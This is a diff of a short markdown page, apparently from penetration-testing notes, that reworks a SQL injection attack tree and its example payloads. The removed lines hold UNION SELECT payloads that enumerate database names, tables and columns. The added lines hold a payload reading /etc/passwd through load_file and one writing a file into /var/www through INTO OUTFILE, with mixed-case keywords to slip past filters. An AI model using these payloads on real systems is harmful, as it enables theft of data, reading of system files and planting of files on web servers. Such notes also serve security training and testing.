@@ -1,4 +1,4 @@
-# Extracting data from the database
+# Read and write local files outside of www root
 
 ## Attack tree
 
@@ -8,26 +8,20 @@
         1.1.1 Inject data in the query without breaking it
     1.2 Find the amount of columns (AND)
     1.3 Find which columns accept queries (AND)
-    1.4 Build an UNION SELECT SQL segment that will modify the WHERE clause and make it true
+    1.4 Build an UNION SELECT SQL segment
     1.5 Inject SQL statements into the column
     1.4 Post exploitation
 ```
 ## Example SQL segments
 
-Database names:
+Read file:
 ```text
--1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata
+-1' UniOn selEct 1,load_file('/etc/passwd') /*
 ```
 
-Tables of a database:
+Write file (only works with permission to write to `/var/www/` of course, otherwise use `/tmp/`):
 ```text
-
--1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]
-```
-
-Column names (with for example `table_name=accounts` or `table_name=users`, depending on tables found):
-```text
--1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
+-1' UniOn selEct null,'example,example' inTo outfile '/var/www/example.txt' /*
 ```
 
 ## Notes
